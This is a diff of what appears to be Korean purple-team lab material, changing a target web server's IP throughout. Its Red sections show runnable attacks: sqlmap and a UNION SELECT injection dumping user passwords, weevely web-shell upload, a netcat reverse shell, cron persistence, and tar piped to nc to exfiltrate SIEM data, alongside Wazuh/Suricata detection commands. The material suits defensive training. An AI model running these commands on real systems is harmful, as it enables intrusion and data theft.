@@ -314,7 +314,7 @@ curl -s -X POST "http://localhost:9100/projects/$PROJECT_ID/execute-plan" \
         "order": 1,
         "instruction_prompt": "echo \"[RED] T1082 Discovery\" && hostname && uname -a && id && echo RED_TEST_DONE",
         "risk_level": "low",
-        "subagent_url": "http://10.20.30.80:8002"
+        "subagent_url": "http://10.20.32.80:8002"
       },
       {
         "order": 2,
@@ -1055,7 +1055,7 @@ pip install --user sigma-cli pysigma pysigma-backend-wazuh sigma2attack
 - Adversary: Purple Team Red
 - Capability: sqlmap, weevely, ssh, dnscat2
 - Infrastructure: 192.168.1.50, evil-c2.example
-- Victim: web (10.20.30.80), siem (10.20.30.100)
+- Victim: web (10.20.32.80), siem (10.20.30.100)
 
 ## 평가 기준
 - 탐지 성공: Wazuh / Suricata 알림 + level 적절
@@ -1068,12 +1068,12 @@ pip install --user sigma-cli pysigma pysigma-backend-wazuh sigma2attack
 
 ```bash
 ATTACKER=10.20.30.112
-WEB=10.20.30.80
+WEB=10.20.32.80
 
 # Red
-ssh ccc@$ATTACKER 'curl -s "http://10.20.30.80/rest/products/search?q=apple" | head'
-ssh ccc@$ATTACKER 'sqlmap -u "http://10.20.30.80/rest/products/search?q=*" --batch --random-agent --threads=4'
-ssh ccc@$ATTACKER 'curl -s "http://10.20.30.80/rest/products/search?q=\\\")) UNION SELECT id,email,password,\\'4\\',\\'5\\',\\'6\\',\\'7\\',\\'8\\',\\'9\\' FROM Users--"'
+ssh ccc@$ATTACKER 'curl -s "http://10.20.32.80/rest/products/search?q=apple" | head'
+ssh ccc@$ATTACKER 'sqlmap -u "http://10.20.32.80/rest/products/search?q=*" --batch --random-agent --threads=4'
+ssh ccc@$ATTACKER 'curl -s "http://10.20.32.80/rest/products/search?q=\\\")) UNION SELECT id,email,password,\\'4\\',\\'5\\',\\'6\\',\\'7\\',\\'8\\',\\'9\\' FROM Users--"'
 
 # Blue 실시간 모니터링
 ssh 6v6-siem 'sudo tail -f /var/ossec/logs/alerts/alerts.json | jq -r "select(.rule.id==\"100200\" or .rule.id==\"100250\") | {ts:.timestamp,src:.data.srcip,desc:.rule.description}"'
@@ -1092,8 +1092,8 @@ ssh 6v6-fw 'sudo tail -f /var/log/suricata/eve.json | jq -r "select(.event_type=
 ```bash
 # Red
 ssh ccc@$ATTACKER 'weevely generate s3cret /tmp/shell.php'
-ssh ccc@$ATTACKER 'curl -X POST "http://10.20.30.80/api/Files" -H "Authorization: Bearer $TOKEN" -F "file=@/tmp/shell.php"'
-ssh ccc@$ATTACKER 'weevely http://10.20.30.80/uploads/shell.php s3cret'
+ssh ccc@$ATTACKER 'curl -X POST "http://10.20.32.80/api/Files" -H "Authorization: Bearer $TOKEN" -F "file=@/tmp/shell.php"'
+ssh ccc@$ATTACKER 'weevely http://10.20.32.80/uploads/shell.php s3cret'
 # > id; whoami; cat /etc/passwd; nc -e /bin/sh 192.168.1.50 4444
 
 # Blue
@@ -1135,7 +1135,7 @@ ssh ccc@web 'ssh -i /home/ccc/.ssh/id_rsa ccc@10.20.30.100 "id; ls /var/ossec/et
 ssh ccc@web 'sshpass -p ccc123 ssh 6v6-siem id'
 
 # Blue
-ssh 6v6-siem 'sudo grep "5715" /var/ossec/logs/alerts/alerts.log | grep "10.20.30.80" | tail'
+ssh 6v6-siem 'sudo grep "5715" /var/ossec/logs/alerts/alerts.log | grep "10.20.32.80" | tail'
 ```
 
 | 시도 | Wazuh | 비고 |
@@ -1492,7 +1492,7 @@ vi /tmp/purple-scenario.md   # 시나리오
 
 # Stage 1-5 (도구 3-7)
 ssh ccc@$ATTACKER 'sqlmap -u "..." --batch'
-ssh ccc@$ATTACKER 'curl -X POST "http://10.20.30.80/api/Files" ...'
+ssh ccc@$ATTACKER 'curl -X POST "http://10.20.32.80/api/Files" ...'
 ssh ccc@web 'echo "..." | sudo tee /etc/cron.d/backup'
 ssh ccc@web 'ssh -i id_rsa ccc@10.20.30.100 id'
 ssh 6v6-siem 'tar -czf - /var/ossec/data | nc 192.168.1.50 4444'
